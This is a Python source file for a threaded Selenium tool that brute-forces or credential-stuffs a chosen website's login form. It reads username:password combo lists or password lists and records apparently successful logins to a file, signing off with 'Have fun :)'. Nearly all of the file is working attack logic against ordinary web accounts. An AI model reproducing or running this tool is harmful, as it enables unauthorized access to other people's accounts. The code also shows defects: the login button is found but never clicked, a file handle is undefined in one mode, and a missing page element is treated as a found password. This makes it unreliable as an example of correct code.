import os
import sys
import threading
import time as t
from enum import Enum

import requests
import selenium
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys

CHROME_DVR_DIR = '/usr/bin/chromedriver'
succfile = os.getcwd() + "/accounts_successfull.txt"


class Type(Enum):
    PASS_LIST = 0
    COMBO_LIST = 1


class Worker(threading.Thread):

    def __init__(self, type, username_selector, password_selector, login_btn_selector, website, combo_list, username):
        threading.Thread.__init__(self)
        self.type = type
        self.username_sel = username_selector
        self.password_sel = password_selector
        self.login_btn_sel = login_btn_selector
        self.web = website
        self.list = combo_list
        self.us = username

        self.found = False
        self._EXECUTE = True

    def run(self):
        print("launching " + str(self.type))
        if self.type == Type.COMBO_LIST:
            self.brutes_combo(self.username_sel, self.password_sel, self.login_btn_sel, self.list, self.web)
        else:
            self.brutes_pass(self.us, self.username_sel, self.password_sel, self.login_btn_sel, self.list, self.web)

    def brutes_combo(self, username_selector, password_selector, login_btn_selector, combo_list, website):
        if self._EXECUTE:
            self.file = open(combo_list, 'r')

            optionss = webdriver.ChromeOptions()
            optionss.add_argument("--disable-popup-blocking")
            optionss.add_argument("--disable-extensions")
            count = 1  # count
            self.browser = webdriver.Chrome(CHROME_DVR_DIR)

            self.fnew = open(self.file.name + '-new-', 'w')
            for line in self.file:
                if not self.found:
                    username = line.split(':')[0]
                    password = line.split(':')[1]
                    self.brutes(username, username_selector, password_selector, login_btn_selector, password, website)
                else:
                    self.fnew.write(line)

            self.fnew.close()
            self.file.close()

            if self.found:
                w1 = Worker(self.type, self.username_sel, self.password_sel, self.login_btn_sel, self.web, self.fnew.name, self.us)
                w1.start()

    def brutes_pass(self, username, username_selector, password_selector, login_btn_selector, pass_list, website):
        self.file = open(pass_list, 'r')

        optionss = webdriver.ChromeOptions()
        optionss.add_argument("--disable-popup-blocking")
        optionss.add_argument("--disable-extensions")
        count = 1  # count
        self.browser = webdriver.Chrome(CHROME_DVR_DIR)
        for line in self.file:
            self.brutes(username, username_selector, password_selector, login_btn_selector, line, website)

    def brutes(self, username, username_selector, password_selector, login_btn_selector, pass_list, website):
        from account_checker import color
        try:
            self.browser.get(website)
            sel_user = self.browser.find_element_by_css_selector(username_selector)  # Finds Selector
            sel_pas = self.browser.find_element_by_css_selector(password_selector)  # Finds Selector
            enter = self.browser.find_element_by_css_selector(login_btn_selector)  # Finds Selector
            self.browser.find_element_by_css_selector(password_selector).clear()
            self.browser.find_element_by_css_selector(username_selector).clear()

            # for i in range(0,oldUSN):
            #     Sel_user.send_keys('\b')

            sel_user.send_keys(username)
            sel_pas.send_keys(pass_list)
            print ('------------------------')
            print (color.GREEN + 'Tried password: ' + color.RED + pass_list + color.GREEN + 'for user: ' + color.RED + username)
            print ('------------------------')
            self.lastPass = pass_list
            self.lastUS = username
            t.sleep(1)

        except KeyboardInterrupt:  # returns to account_checker menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS!')
            print('LAST PASS ATTEMPT BELLOW')
            print(color.GREEN + 'Password has been found: {0}'.format(self.lastPass))
            print(color.YELLOW + 'Have fun :)')

            # Foud a result, write it in the succesfull accounts file
            self.found = True
            self._EXECUTE = False
            f1 = open(succfile, 'a')
            f1.writelines(self.lastUS + ":" + self.lastPass)
            f1.close()

            # Close the current browser session
            self.browser.close()

            # Add the current username and password (which failed) to the new file
            self.fnew.write(username + ':' + pass_list)
